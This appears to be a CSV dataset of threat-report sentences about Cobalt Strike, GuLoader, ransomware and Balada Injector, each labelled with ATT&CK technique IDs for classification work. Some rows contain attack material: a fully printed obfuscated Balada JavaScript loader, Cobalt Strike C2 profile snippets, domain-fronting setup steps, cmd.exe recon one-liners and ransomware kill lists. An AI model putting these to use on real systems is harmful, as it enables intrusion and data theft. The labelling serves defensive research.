"When a new FOCUSFJORD sample is first executed and writes its configuration to registry, this value is set to “default” and is later manually changed by the actor, usually to the victim’s domain name or organization name.","T1112, T1082"
"The registry key names are hardcoded into every FOCUSFJORD sample, as the malware needs to read and decrypt those registry key values for proper execution.","T1140, T1012"
"The document contains ""C:\Users\Iran"" paths that were likely included to obfuscate the source of the activity.",T1027
"After several months of repeated detections, UNC215 deployed an updated version of HYPERBRO and a tool called “anti.exe” to stop Windows Update service and terminate EDR and Antivirus related services.",T1562.001
"For initial access, the group commonly leverages spear-phishing and tries to trick the victims into opening malicious documents hosted in commercial file-sharing services.",T1566.001
"On the compromised machine, they use tools such as Mimikatz to dump credentials.",T1003.001
"MuddyWater generally uses DNS to communicate with their C2 servers while using tools such as PowerShell, vpnui[.]exe (a unique version of Ligolo), and remote monitoring software such as ScreenConnect, Remote Utilities, and eHorus.",T1219
It disguises itself as a legitimate Google Update executable.,T1036.005
"It collects the victim’s username, computer name, and IP address and sends it to the MuddyWater group.","T1033, T1016, T1082"
They used multiple malicious PDFs and MS Office documents during the campaign.,T1566.001
"As an evolving threat actor, they added a new tool for remote access, Syncro, to their arsenal.",T1219
"We cover topics such as domain fronting, SOCKS proxy, C2 traffic, Sigma rules, JARM, JA3/S, RITA & more.",T1090
"This function and all of its fields could also exist and be customized for the HTTP-POST Block (Server communication)### http-get { set uri ""/<URI string>""; <================ # Specifying the URI to reference in bidirectional communication from client and server set verb ""POST""; <================ # Setting the verb when requesting available tasks from the C2 server.",T1071.001
"You can mix and match fields below: metadata { #base64; <================ # Base64 encoded string base64url; <================ # URL safe Base64 encoded string #mask; <================ # Encrypting and encoding the data with XOR mask and random key #netbios; <================ # Encoding data as netbios in lower case #netbiosu; <================ # Another variation of netbios encoding #prepend ""TEST123""; <================ # Choosing a string to prepend to the transmitted data append "".php""; <================ # Choosing a string to append ### Termination statements: This statement tells Beacon and its server wherein the transaction to store the transformed data.",T1573.001
Domain Fronting Domain fronting is another method for concealing communication between the endpoint and the command and control servers.,T1090
The main purpose of domain fronting is to connect to a restricted host while pretending to communicate with an allowed host.,T1090
It essentially masks your traffic to a certain website by masquerading it as a different domain.,T1090
"Domain fronting was mostly used by web services to bypass censorship in several countries that restricted traffic (e.g., China).",T1090
"In recent years, attackers have started using this technique to hide their malicious infrastructure behind legitimate domains.",T1090
"Because domain fronting is a complicated topic to grasp, below we have included an image from the official Cobalt Strike page that discusses this technique.",T1090
Cobalt Strike made domain fronting possible by allowing the operators to configure related settings via the malleable C2 profiles.,T1090
The following prerequisites must be met in order for domain fronting to be possible: Own a domain.,T1090
"(e.g., cloudfront.net).",T1090
Setup the CDN service to create a new CDN endpoint and redirect traffic to your domain.,T1090
"(e.g., l33th4x0r.cloudfront.net).",T1090
Setup a profile to facilitate domain fronting.,T1090
Identify a domain that uses the same CDN to ensure that the traffic will be forwarded to the correct resource.,T1090
Attackers can use legitimate domains that are registered under the same CDN provider.,T1090
"In that way, the legitimate website will forward the traffic through the CDN to the original destination according to the host header.",T1090
"In the screenshots below, you can see how the malleable C2 profiles are configured to allow domain fronting using the Fastly and AzureEdge CDNs:",T1090
"This research paper released by academics from the University of California, Berkeley, is a great introduction to domain fronting.",T1090
One of those researchers is Vincent who wrote a great article on domain fronting.,T1090
He also published a Python script to identify possible domains that can be leveraged for domain fronting.,T1090
"Looking into our reporting, we don’t see many instances of domain fronting.",T1090
"Although, based on the data we have collected regarding malicious infrastructure, domain fronting appears to be used by threat actors.",T1090
More information on this service and others can be found here.,T1090
Reverse Proxy using Cobalt Strike Beacon A technique that we come across often is a reverse proxy.,T1090
We see instances where threat actors use their beacon sessions to establish RDP access through a reverse proxy.,"T1090, T1021.001"
Cobalt Strike has the ability to run a SOCKS proxy server on the team server.,T1090
This enables the operators to setup a listening port and leverage it to relay traffic to and from the open beacon session.,T1090
Image credit: cobaltstrike.com Some of the cases we have observed threat actors using reverse proxy are: Diavol Ransomware BazarLoader and the Conti Leaks Snatch Ransomware,T1090
"In most, of the above cases, the aim of the attackers was to establish a Remote Desktop session.",T1021.001
"There are numerous advantages to establishing a RDP session, including the ability to navigate using a graphical environment and easily move laterally once the necessary access has been granted.",T1021.001
"Below, we demonstrate how attackers take advantage of this technique using proxychains from the attackers’ kali Linux host.",T1090
"In this second image, we employ proxychains from the attacker’s Kali Linux host to RDP into our target’s environment via the SOCKS server.","T1090, T1021.001"
We essentially add the team server’s IP address into the proxychains configuration and connect with xfreerdp.,"T1090, T1021.001"
"RDP into the target host using reverse proxy Looking into the generated artifacts, we can see that a 4624 type 3 event is created on the target host.","T1090, T1021.001"
"One interesting aspect that we have also mentioned in similar cases from our reporting is that the victim’s hostname is captured in this logon event as well as the source address being 127.0.0.1. Security Event ID 4624 Type 3 shows the attacker’s hostname Once again, the running Cobalt Strike beacon acts as the intermediary to facilitate the Remote Desktop session via reverse proxy.","T1090, T1021.001, T1082"
"After that, we’ll examine network data associated with lateral movement and the various methods employed by Cobalt Strike operators based on our observations.",T1071.001
HTTP/HTTPS C2 traffic,T1071.001
"At the top half of the screenshot, we show the HTTP communication between the Beacon and the Cobalt Strike server.",T1071.001
Below is the infrastructure that we used for demonstration purposes: Target Host: 192.168.88.179 Internal DNS server: 192.168.88.2 Cobalt Strike C2 domain: infosecppl.store We instructed the Beacon to execute the command systeminfo on the compromised host.,T1082
"As you can see from the screenshot below, it took 148 packets containing DNS requests and responses to finish the task and send back the data to the Cobalt Strike Server.",T1041
SMB beacons open a local port on the target host and listen for incoming communication from a parent beacon.,T1090
For a list of default pipe names for other services including some custom profiles check out @svch0st’s post here.,T1090
SMB beacons are mostly used to make network detection harder and to get access to isolated systems where communication to the internet is prohibited.,T1090
"In our case, the SMB Beacon is communicating over the network with a parent Beacon using named pipes.",T1090
"Below, you can see the named pipe created that we specified on the Cobalt Strike interface when we created the SMB listener.",T1090
"Furthermore, the SMB Beacon will communicate over port 445 to the main beacon as we described above, which will then send the results to the C2 server.",T1041
The network traffic shows the target host communicating over SMB with the other compromised host running the parent HTTP Beacon.,T1071.001
"192.168.38.102 = SMB Beacon 192.168.38.104 = HTTP Parent Beacon Detecting and Analyzing C2 Traffic Thanks to free, open-source tooling, investigating network traffic has become more accessible.",T1071.001
Called JARM Randomizer the tool can be configured as a proxy in front of the Cobalt Strike server to serve up false data to potential internet scanners.,T1090
"We will also discuss our strategies of stealthy instrumentation for analysis of encrypted network traffic, to combat the ways SSL can be used to complicate command-and-control (C2) traffic analysis.",T1095
"File infectors usually call their malicious code very early (e.g., by replacing an early call instruction to their malicious code, or by overwriting the entry point in the PE header) before any function calls from external libraries are ever called.",T1055
"If we can get the malware sample under analysis to get past the Windows loader, initialize itself and unpack any additional payloads, we have a much better shot at detection.",T1027
"As HTTPS and other protocols built on SSL have become increasingly ubiquitous for accessing resources across the internet, it’s not surprising that malware authors also use this protocol for other things, such as pulling down the next stage of their payload, or C2 communications.",T1071.001
One solution we’ve found useful for this problem is to detect when TLS connections are being initiated and log the symmetric keys generated for the SSL/TLS connection using virtual machine introspection (VMI).,T1573.001
"An example output, which includes everything needed to decrypt TLS traffic, is shown in Figure 7.",T1140
Final keys and initialization vectors used to encrypt and decrypt network traffic are generated from the master secret through a key expansion.,"T1027, T1140"
"The sample is loaded by a loader written in Delphi, which downloads the next stage from a public file storage service using HTTPS.","T1105, T1071.001"
"If we open the recorded package capture in Wireshark and provide the extracted SSL/TLS keys that were extracted by the analysis platform, we should be able to see the SSL encrypted traffic to the public file storage service, including the downloaded data.","T1027, T1071.001"
"For example: Wireshark -r guest_traffic.pcap -o ""ssl.keylog_file:key_capture.keys"" After opening the capture (pcap) in Wireshark, the TLS encrypted data will be decrypted, and we can use the http filter to get the decrypted HTTPS traffic.","T1027, T1140, T1071.001"
"There, the user will be encouraged to download a malicious installer that embeds the Crypter with the payload.","T1027, T1204.002"
"The domains are signed with a certificate (via LetsEncrypt), which enables an HTTPS connection.",T1071.001
"The following figure emphasizes the complexity of the evasive techniques that are implemented in the Crypter. Figure 5: Low detection rate on VT The Installer Once downloaded and executed, the malicious installer copies its compressed files into a newly created folder with a legitimate-looking name (i.e., IIS Application Health Monitor) in one of the following directory paths: C:\Users\<user>\AppData\Roaming\C:\Users\<user>\AppData\Local\ The malicious files are copied along with many other open-source or free application-related files.",T1036.005
"At first glance, the files within the directory may seem legitimate.",T1036.005
"Alternatively, its role may be to deceive the user into thinking that the application has failed to execute, even as it silently continues the malicious execution in the background.",T1204.002
"The threat actor generally embeds the next stages of the execution inside an additional file, usually an XML or a PDF file.",T1027
"Here, just like before, the actor embeds the malicious code inside different legitimate codes.",T1027
"Persistency Implementation If the crypter is configured to install persistence, the loader DLL will execute a new thread that loads another DLL (from the compressed files) that will handle this task. Figure 12: New thread creation for calling the persistent mechanism The newly loaded DLL will either use one of the following logics or both of them to implement the persistency: Write a.lnk file in the startup folder that executes the Crypter’s main executable.",T1547.001
Figure 13: .lnk file persistence implementation Write a registry Run key that executes the Crypter’s main executable.,T1547.001
Figure 14: registry run key persistence implementation The Decryption Shellcode The XML file (or any other file type used by the crypter) contains the following components: The first shellcode (referred to in this section).,"T1027, T1547.001, T1140"
"An encrypted additional shellcode (referred to in the next section, the Loader shellcode) An encrypted payload.","T1027, T1140"
"The Decryption shellcode has three main tasks: first, it extracts the Loader shellcode and the payload, then it decrypts them, and finally, it transfers the execution to the decrypted Loader shellcode.",T1140
Figure 15: Decryption shellcode execution flow The Decryption shellcode begins with dynamically locating the configuration structure by searching for a sequence of six or more identical bytes.,T1140
"This configuration holds pointers to the loader shellcode and the final payload; these are encrypted and split inside the XML. Figure 16: Configuration and XML file’s structures Based on this, we can identify the configuration inside the XML file: Figure 17: Configuration structure Using this configuration the malware iterates over each chunk copies it, and decrypts it using the denoted decryption key (the configuration changes between samples).","T1027, T1140"
It replaces the first placeholder with the address of the decrypted payload and the latter with the size of the payload.,T1140
The Loader Shellcode The purpose of the Loader shellcode is to inject the decrypted payload within the currently running process (itself).,"T1055, T1140"
"Figure 18: Extracting the data for injection and correction stages To start initializing, the Loader first saves the decrypted payload address and payload size according to the placeholder’s addresses.",T1140
"Within it, the Loader overwrites the current PE with the final payload’s PE.",T1055
It does so by copying the PE headers and each section according to the current executable’s base address.,T1055
"Figure 19: Change headers protection and clear memory bytes for the new PE Once previous bytes have been cleared, the Loader copies the new PE headers to the base address and each section to the relevant location according to the IMAGE_SECTION_HEADER.",T1055
Correction The final stage is responsible for fixing the import address table and relocation table of the newly injected PE.,T1055
"In addition to fixing the import address and relocation tables, the Loader removes evidence of injection by using the following methods: Update the LDR data table entry to match the injected PE.",T1027
Remove the injected PE headers from memory.,T1027
"Finally, the malware jumps to the entry point of the newly injected PE with the original command-line arguments.",T1055
"These evasion techniques are used in an effort to impair or disable system defenses as well as to stop certain applications that may lock files open on disk, causing problems when trying to encrypt them.",T1562.001
"The process list checked is as follows: agntsvc, dbeng50, dbsnmp, encsvc, excel, firefox, infopath, isqlplussvc, msaccess, mspub, mydesktopqos, mydesktopservice, notepad, ocautoupds, ocomm, ocssd, onenote, oracle, outlook, powerpnt, sqbcoreservice, sql, steam, synctime, tbirdconfig, thebat, thunderbird, visio, winword, wordpad, xfssvccon, *sql*, bedbh, vxmon, benetns, bengien, pvlsvr, beserver, raw_agent_svc, vsnapvss, CagService, QBIDPService, QBDBMgrN, QBCFMonitorService, SAP, TeamViewer_Service, TeamViewer, tv_w32, tv_x64, CVMountd, cvd, cvfwd, CVODS, saphostexec, saposcol, sapstartsrv, avagent, avscc, DellSystemDetect, EnterpriseClient, VeeamNFSSvc, VeeamTransportSvc, VeeamDeploymentSvc",T1057
"The services running on the compromised system are checked against the following list: mepocs, memtas, veeam, svc$, backup, sql, vss, msexchange, sql$, mysql, mysql$, sophos, MSExchange, MSExchange$, WSBExchange, PDVFSService, BackupExecVSSProvider, BackupExecAgentAccelerator, BackupExecAgentBrowser, BackupExecDiveciMediaService, BackupExecJobEngine, BackupExecManagementService, BackupExecRPCService, GxBlr, GxVss, GxClMgrS, GxCVD, GxCIMgr, GXMMM, GxVssHWProv, GxFWD, SAPService, SAP, SAP$, SAPD$, SAPHostControl, SAPHostExec, QBCFMonitorService, QBDBMgrN, QBIDPService, AcronisAgent, VeeamNFSSvc, VeeamDeploymentService, VeeamTransportSvc, MVArmor, MVarmor64, VSNAPVSS, AcrSch2Svc In an effort to maintain persistence, the BlackCat ransomware excludes key system and application folders – as well as key components – from encryption so as not to render the system and ransomware inoperative.",T1057
"The credentials also allow BlackCat to move laterally within the victim’s system and/or network, often with administrative privileges.",T1078
Credential access permits the ransomware to deploy additional tools that further propagate the attack.,T1105
"Associated Tools BlackCat has been observed using multiple – often legitimate – tools throughout their attacks, such as Mimikatz, LaZagne and WebBrowserPassView to recover stored passwords, as well as GO Simple Tunnel (GOST) and MEGAsync to exfiltrate data.",T1003.001
"BlackCat utilizes a unique onion domain with a victim-specific access key for the victim to use to learn more about the attack, their data, and what the threat actors want the victim to do next.",T1090
"For information on Common Vulnerabilities and Exposures (CVE) known to be exploited by malicious Chinese state-sponsored cyber actors, see: CISA-FBI Joint CSA AA20-133A: Top 10 Routinely Exploited Vulnerabilities, CISA Activity Alert: AA20-275A: Potential for China Cyber Response to Heightened U.S.-China Tensions, and NSA CSA U/OO/179811-20: Chinese State-Sponsored Actors Exploit Publicly Known Vulnerabilities.",T1090
Encrypted Multi-Hop Proxies.,T1090
Chinese state-sponsored cyber actors have been routinely observed using a VPS as an encrypted proxy.,T1090
The cyber actors use the VPS as well as small office and home office (SOHO) devices as operational nodes to evade detection.,T1090
"These scans can be automated, through Python:registered: scripts, to locate certain files, paths, or vulnerabilities.",T1083
"The cyber actors can gain valuable information on the victim network, such as the allocated resources, an organization’s fully qualified domain name, IP address space, and open ports to target or exploit.",T1016
[D3-EAL] Network Isolation DNS Denylisting [D3-DNSDL] Outbound Traffic Filtering [D3-OTF] Exploit Public-Facing Application [T1190] Chinese state-sponsored cyber actors have exploited known vulnerabilities in Internet-facing systems.[1],T1190
Deploying a public proof of concept (POC) exploit targeting a public-facing appliance vulnerability.,T1190
These emails may contain a malicious link or files that will provide the cyber actor access to the victim’s device after the user clicks on the malicious link or opens the attachment.,"T1566.001, T1204.002"
Targeting Microsoft Exchange offline address book (OAB) virtual directories (VDs).,T1190
"Exploiting Internet accessible webservers using webshell small code injections against multiple code languages, including net, asp, apsx, php, japx, and cfm.",T1190
"[T1078]: Default Accounts [T1078.001] Domain Accounts [T1078.002] Chinese state-sponsored cyber actors have been observed: gaining credential access into victim networks by using legitimate, but compromised credentials to access OWA servers, corporate login portals, and victim networks.",T1078
"[T1059.006] JavaScript [T1059.007] Network Device CLI [T1059.008] Chinese state-sponsored cyber actors have been observed: Using cmd.exe, JavaScript/Jscript Interpreter, and network device command line interpreters (CLI).",T1059.003
"Using PowerShell to conduct reconnaissance, enumeration, and discovery of the victim network.",T1210
Employing Python scripts to exploit vulnerable servers.,T1210
Restrict which commands can be used.,T1059.003
"Windows Command Shell Restrict use to administrator, developer, or power user systems.",T1059.003
"[T1053.005] Chinese state-sponsored cyber actors have been observed using Cobalt Strike, webshells, or command line interface tools, such as schtask or crontab to create and schedule tasks that enumerate victim devices and networks.","T1059.003, T1053.005"
These emails may contain a malicious link or file that provide the cyber actor access to the victim’s device after the user clicks on the malicious link or opens the attachment.,"T1566.001, T1204.002"
[T1543]: Windows Service [T1543.003] Chinese state-sponsored cyber actors have been observed executing malware shellcode and batch files to establish new services to enable persistence.,"T1059.003, T1543.003"
[T1484.001] Chinese state-sponsored cyber actors have also been observed modifying group policies for password exploitation.,T1484.001
"[T1055.002] Chinese state-sponsored cyber actors have been observed: Injecting into the rundll32.exe process to hide usage of Mimikatz, as well as injecting into a running legitimate explorer.exe process for lateral movement.","T1003.001, T1055"
Using shellcode that injects implants into newly created instances of the Service Host process (svchost),T1055
Chinese state-sponsored cyber actors’ Defensive Evasion TTPs with detection and mitigation recommendations Threat Actor Technique / Sub-Techniques Threat Actor Procedure(s) Detection and Mitigation Recommendations Defensive Tactics and Techniques Deobfuscate/Decode Files or Information [T1140] Chinese state-sponsored cyber actors were observed using the 7-Zip utility to unzip imported tools and malware files onto the victim device.,T1140
[D3-EAL] Indicator Removal from Host [T1070] Chinese state-sponsored cyber actors have been observed deleting files using rm or del commands.,T1070.004
[D3-EAL] Obfuscated Files or Information [T1027] Chinese state-sponsored cyber actors were observed Base64 encoding files and command strings to evade security measures.,T1027
"[T1218] Mshta [T1218.005] Rundll32 [T1218.011] Chinese state-sponsored cyber actors were observed using Microsoft signed binaries, such as Rundll32, as a proxy to execute malicious payloads.",T1218.011
[T1003.003] Chinese state-sponsored cyber actors were observed targeting the LSASS process or Active directory (NDST.DIT) for credential dumping.,T1003.001
[T1083] Chinese state-sponsored cyber actors have been observed using multiple implants with file system enumeration and traversal capabilities.,T1083
"[D3-SCA] User Behavior Analysis [D3-UBA] Process Discovery [T1057] Chinese state-sponsored cyber actors have been observed using commands, including tasklist, jobs, ps, or taskmgr, to reveal the running processes on victim devices.",T1057
"[T1018] Chinese state-sponsored cyber actors have been observed using Base-64 encoded commands, including ping, net group, and net user to enumerate target network information.",T1027
"Detection and Mitigation Recommendations Defensive Tactics and Techniques Exploitation of Remote Services [T1210] Chinese state-sponsored cyber actors used valid accounts to log into a service specifically designed to accept remote connections, such as telnet, SSH, RDP, and Virtual Network Computing (VNC).","T1210, T1078"
The actor may then perform actions as the logged-on user.,T1078
Chinese state-sponsored cyber actors also used on-premises Identity and Access Management (IdAM) and federation services in hybrid cloud environments in order to pivot to cloud resources.,T1078
"Chinese state-sponsored cyber actors used valid accounts to log into a service specifically designed to accept remote connections, such as telnet, SSH, RDP, and Virtual Network Computing (VNC).","T1210, T1078"
[D3-FAPA] Process Spawn Analysis [D3-PSA] Isolate: Execution Isolation Executable Denylisting [D3-EDL] Clipboard Data [T1115] Chinese state-sponsored cyber actors used RDP and execute rdpclip.exe to exfiltrate information from the clipboard.,T1021.001
"Detect: Network Traffic Analysis Remote Terminal Session Detection [D3-RTSD] Isolate: Network Isolation Inbound Traffic Filtering [D3-ITF] Outbound Traffic Filtering [D3-OTF] Data Staged [T1074] Chinese state-sponsored cyber actors have been observed using the mv command to export files into a location, like a compromised Microsoft Exchange, IIS, or emplaced webshell prior to compressing and exfiltrating the data from the target network.",T1074.001
Using malware implants that use the Dropbox:registered: API for C2 and a downloader that downloads and executes a payload using the Microsoft OneDrive:registered: API.,T1105
[T1105] Chinese state-sponsored cyber actors have been observed importing tools from GitHub or infected domains to victim networks.,T1105
Chinese state-sponsored cyber actors used the Server Message Block (SMB) protocol to import tools into victim networks.,T1570
Proxy [T1090]: Multi-Hop Proxy [T1090.003] Chinese state-sponsored cyber actors have been observed using a network of VPSs and small office and home office (SOHO) routers as part of their operational infrastructure to evade detection and host C2 activity.,T1090
Some of these nodes operate as part of an encrypted proxy service to prevent attribution by concealing their country of origin and TTPs.,T1090
"The Balada script injection occurs in the malicious posts-layout/dist/job.php file:./wp-content/plugins/posts-layouts/dist/job.phpIn the posts_layouts_head() function we can see the telltale character code obfuscation being used here, which seems to be a favorite of the Balada malware threat actors.",T1140
"When decoded, the following script injection is revealed from cdn[.]scriptsplatform[.]com:<script src='hxxps://cdn[.]scriptsplatform[.]com/scripts/stats.js' type='text/javascript'></script>",T1140
The same job.php file also contains a backdoor that executes arbitrary PHP code sent as a POST request parameter “dd1”.,T1071.001
"Safari/537.36""The malicious stats.js payload JavaScript file is, as usual, a heavily obfuscated script that looks like the following:Moreover, the WordPress wp_head hook is used within the payload, which ensures that the JavaScript injection is lodged within the header section of the website on every page.",T1027
"For example:./wp-sale-need-wuu.php ./wp-sold-need-xdd.php ./wp-mails-need-lxj.php ./wp-mails-need-wjo.php ./wp-drop-need-baj.php ./wp-working-need-css.php ./wp-locations-need-bot.php ./wp-readmes-need-rfq.php ./wp-track-need-ito.php ./wp-cliff-need-oxy.php ./wp-sale-need-vzw.php ./wp-working-need-bkv.php ./wp-working-need-ygr.php The contents of these files look a little something like this, with slight variations for each:When decoded, a backdoor is revealed:This backdoor executes arbitrary PHP code sent in POST request parameters.","T1140, T1071.001"
"In addition, it also tries to delete the wp-sale.js file created at the same time as the backdoor.",T1070.004
"In such cases, we find the following modified wp-blog-header.php file which includes injected obfuscated PHP code (again using character code obfuscation):The decoded malware looks like this:What we can see is the malware again tries to inject three malicious scripts:hxxps://cdn.scriptsplatform[.]com/scripts/start_h.js into the header of the bloghxxps://cdn.scriptsplatform[.]com/scripts/start_f.js into the footer of the bloghxxps://cdn.scriptsplatform[.]com/scripts/start_c.js into the main content of the blogInterestingly enough, the start_c.js script is only injected into single pages while start_f.js is injected even to known users of the blog.Start_h.js and start_c.js return the same script as the header/footer/stat.js described in the posts_layouts infection.",T1027
"Jquery injectionsIn some cases, the following obfuscated JavaScript code is injected on top of wp-includes/js/jquery/jquery.min.js and wp-includes/js/jquery/jquery-migrate.min.jsvar m=b;(function(c,e){var l=b,f=c();while(!![]){try{var g=parseInt(l(0x135))/0x1+parseInt(l(0x12b))/0x2+-parseInt(l(0x12d))/0x3+parseInt(l(0x13d))/0x4+-parseInt(l(0x12e))/0x5*(parseInt(l(0x12a))/0x6)+parseInt(l(0x12f))/0x7*(-parseInt(l(0x13e))/0x8)+parseInt(l(0x13c))/0x9;if(g===e)break;else f['push'](f['shift']());}catch(h){f['push'](f['shift']());}}}(a,0x7f054));function b(c,d){var e=a();return b=function(f,g){f=f-0x128;var h=e[f];return h;},b(c,d);}var j=document,k=j[m(0x130)](m(0x12c));k[m(0x138)]='h'+'tt'+m(0x13f)+'/'+'/s'+'ta'+m(0x128)+'t'+m(0x134)+'ri'+'p'+'ts'+m(0x132)+'tf'+'or'+m(0x13a)+m(0x136)+'lo'+'b'+'al';function a(){var n=['3558289hXnVzT','createElement','getElementsByTagName','pla','insertBefore','ics.sc','420078GNrZss','m/g','currentScript','src','head','m.co','parentNode','8887806xXCyNX','388724nuSCLw','8ZOcngi','ps:','tis','appendChild','3101916zsXWgk','1138664hDNQfV','script','1585608NAjuAN','5gMyIif'];a=function(){return n;};return a();}document[m(0x137)]?document[m(0x137)][m(0x13b)][m(0x133)](k,document[m(0x137)]):j[m(0x131)](m(0x139))[0x0][m(0x129)](k);This script also belongs to Balada Injector and loads hxxps://statistics.scriptsplatform[.]com/global.",T1027
"After gaining access to victims’ networks, Royal actors disable antivirus software and exfiltrate large amounts of data before ultimately deploying the ransomware and encrypting the systems.",T1562.001
"According to open-source reporting, victims have unknowingly installed malware that delivers Royal ransomware after receiving phishing emails containing malicious PDF documents [T1566.001], and malvertising [T1566.002].[2] Remote Desktop Protocol (RDP).",T1566.001
The second most common vector Royal actors use (in 13.3% of incidents) for initial access is RDP compromise.,T1021.001
FBI has also observed Royal actors gain initial access through exploiting public-facing applications [T1190]. Brokers.,T1190
"Command and Control Once Royal actors gain access to the network, they communicate with command and control (C2) infrastructure and download multiple tools [T1105].",T1105
Lateral Movement and Persistence Royal actors often use RDP to move laterally across the network,T1021.001
Microsoft Sysinternals tool PsExec has also been used to aid lateral movement.,T1570
"In one confirmed case, the actors used a legitimate admin account to remotely log on to the domain controller [T1078].",T1078
"Once on the domain controller, the threat actor deactivated antivirus protocols",T1562.001
[T1562.001] by modifying Group Policy Objects,T1484.001
"Encryption Before starting the encryption process, Royal actors: Use Windows Restart Manager to determine whether targeted files are currently in use or blocked by other applications [T1486].[1] Use Windows Volume Shadow Copy service (vssadmin.exe) to delete shadow copies to prevent system recovery.[1] FBI has found numerous batch (.bat) files on impacted systems which are typically transferred as an encrypted 7zip file.","T1027, T1059.003"
"Batch files create a new admin user [T1078.002], force a group policy update, set pertinent registry keys to auto-extract","T1059.003, T1484.001"
"and execute the ransomware, monitor the encryption process, and delete files upon completion—including Application, System, and Security event logs [T1070.001].",T1070.004
"Similar to the previous activity, GuLoader execution begins with the user clicking on a shortcut file and launching a PowerShell command, which retrieves a decoy tax document and VBS script.","T1105, T1204.002"
"Like GuLoader VBScript variants in the past, this is highly obfuscated and contains junk code to impede analysis.",T1027
The script concatenates hundreds of smaller strings into a single variable which ultimately builds and executes a PowerShell command.,T1027
"Summary of GuLoader's Execution Chain Before stepping through each step in GuLoader’s execution chain in more detail, we can summarize the entire process: Tefor.vbs VBScript is executed by the user clicking a shortcut file.",T1204.002
BitsTransfer is used to retrieve a payload package containing the second stage PowerShell and two shellcode buffers.,T1105
Shellcode B is decoded by Shellcode A and reflectively loaded.,T1140
Shellcode B is used to retrieve and inject Remcos RAT into a legitimate Windows process such as ieinstal.exe.,T1055
"First Stage PowerShell The PowerShell command contains various obfuscated strings, as seen in the right side of Figure 3.",T1027
These strings are passed to a de-obfuscation function (Sawmo9).,T1140
Figure 4 First stage PowerShell de-obfuscation routine.,T1140
Assigns a variable that checks if the system is 64-bit and if the 32-bit PowerShell exists in the syswow64 folder.,T1082
"If the system is 64-bit and the 32-bit PowerShell exists in the correct path, execute a new 32-bit PowerShell process copying the current process command line as a new argument.",T1059.003
This is likely done to reload PowerShell with the full command line argument but with a 32-bit process required for GuLoader’s shellcode.,T1059.003
Base64 decodes the payload content.,T1140
"Instead of writing more payloads to registry, a single payload package is retrieved that contains both the two-stage shellcode and additional PowerShell commands.",T1027
These strings are passed to a decoding function where they are converted from hex to byte and XOR’d with decimal 18.,T1140
"To speed up analysis, a write-output cmdlet can be inserted into the function to print the decoded strings to the screen during runtime.",T1140
This shellcode is used to decode the second buffer using key 58 3E 88 D0.,T1140
"Figure 12 Key derived from Shellcode A. Shellcode B Copies 204836 bytes of shellcode from the same payload package beginning at offset 648.Once decoded, this shellcode is responsible for fetching Remcos RAT from hxxp://194.55.224[.]183/frsh/iFaeETTILhlw208.bin and injecting it into ieinstall.exe.","T1105, T1055, T1140"
GuLoader leverages user-initiated scripts or shortcut files to execute multiple rounds of highly obfuscated commands and encrypted shellcode.,T1027
Recent GuLoader campaigns employ a topical tax-themed lure as a way of enticing users to click on malicious shortcut files.,T1204.002
"The tool provides various remote access and surveillance features including keylogging, screenshots and audio recording among other features which make the tool an attractive choice for threat actors.","T1056.001, T1113, T1219"
"The variants Tohnichi (active in 2021), Mallox, and Fargo (both active in 2022) targeted vulnerabilities in Microsoft SQL (MS SQL) Server for initial access.",T1190
"This latest TargetCompany variant executed a spam campaign with malicious OneNote file attachments, a deviation from its roots of targeting vulnerable MS SQL databases.",T1566.001
"Our investigations revealed that the payload downloaded by the PowerShell script was a .NET downloader, which would subsequently retrieve an encrypted payload from the command-and-control (C&C) server.",T1105
A closer look at the reflective loading technique that TargetCompany threat actors incorporated; the IP address it connects to changes every 24 hours and deploys different payloads The payload would then be decrypted through XOR or inversion and executed in memory.,T1140
Both Mallox and Fargo variants use a set of tools via remote desktop for defense evasion.,T1021.001
"Meanwhile, the Remcos backdoor payload is executed via WmiPrvSE.exe, and the payload most likely arrives by exploiting public-facing websites and domains.",T1190
Our investigations showed that the gang used different sets of defense evasion and reconnaissance tools such as GMER and Advance Process Termination to manually uninstall antivirus products on the target system.,T1562.001
"We also observed the presence of YDArk.exe (PCHunter64) for performing rootkit behaviors, and that TargetCompany attempts to terminate security-related processes and services by dropping KILLAV.",T1562.001
"In addition, the ransomware drops a batch file named killer.bat that terminates various services and applications, including GPS-related services.",T1059.003
"Afterward, it proceeds to steal system information like machine details and other relevant data.",T1082
"Our investigations also revealed that the ransomware might have connections with other groups such as the BlueSky ransomware, as well as the threat actors who perform brute-force attacks on MS SQL Servers.",T1110
We assess it is highly likely that these attacks were conducted by a Chinese cyberespionage actor related to the Operation Soft Cell campaign.,T1190
The initial attack phase involves infiltrating Internet-facing Microsoft Exchange servers to deploy webshells used for command execution.,T1190
The malware implemented a series of Mimikatz modifications on closed-source tooling.,T1003.001
These techniques include in-memory mapping of malicious images to evade EDR API hooks and file-based detections surgically terminating Event Log threads instead of the host process to inhibit logging without raising suspicions staging a credential theft capability in the LSASS process itself by abusing native Windows capabilities.,T1003.001
The threat actors used C:\MS_DATA as their main working directory for storing malware and staging data for exfiltration.,T1074.001
"For example, the attackers used dsquery and query to obtain information about Active Directory objects, including user information, and Remote Desktop user sessions.",T1021.001
"""cmd"" /c cd /d C:\MS_DATA\&dsquery * -limit 0 -filter ""cmd"" /c cd /d",T1059.003
"-attr objectSID sAMAccountName displayName mail memberOf >da.back&cd ""cmd"" /c cd /d c:\windows\system32\inetsrv\&query user&cd ""cmd"" /c cd /d",T1059.003
The attackers then check connectivity with both the Internet and specific local machines of interest.,T1059.003
"""cmd"" /c cd /d",T1059.003
"c:\windows\system32\inetsrv\&ping 8.8.8.8 -n 1&cd ""cmd"" /c cd /d",T1059.003
"[IP ADDRESS/HOSTNAME]&cd They also retrieve networking information, like network adapters, specific machines, and network services like Remote Desktop Protocol (RDP).","T1016, T1059.003"
"""cmd"" /c cd /d C:\MS_DATA\&ipconfig",T1059.003
"/all&cd ""cmd"" /c cd /d",T1059.003
"c:\windows\system32\inetsrv\&net use&cd ""cmd"" /c cd /d",T1059.003
"c:\windows\system32\inetsrv\&netstat.exe -nob ""cmd"" /c cd /d c:\windows\system32\inetsrv\&netstat -aon |find ""3389""&cd ""cmd"" /c cd /d C:\MS_DATA\&netstat -aon |find ""[IP ADDRESS]""&cd",T1059.003
The threat actor made use of the native makecab tool to compress information gathered for exfiltration.,T1059.003
"""cmd"" /c cd /d C:\MS_DATA\&makecab da.back d.zip >1.txt&cd For lateral movement, the attackers made use of the PsExec tool and the net use command for accessing shared resources on remote machines.","T1570, T1059.003"
[PASSWORD] /u:[DOMAIN]\[USERNAME] A Penchant for Credential Theft,T1003.001
"In order to steal credentials, the attackers employ custom modified versions of Mimikatz, including an executable named pc.exe.",T1003.001
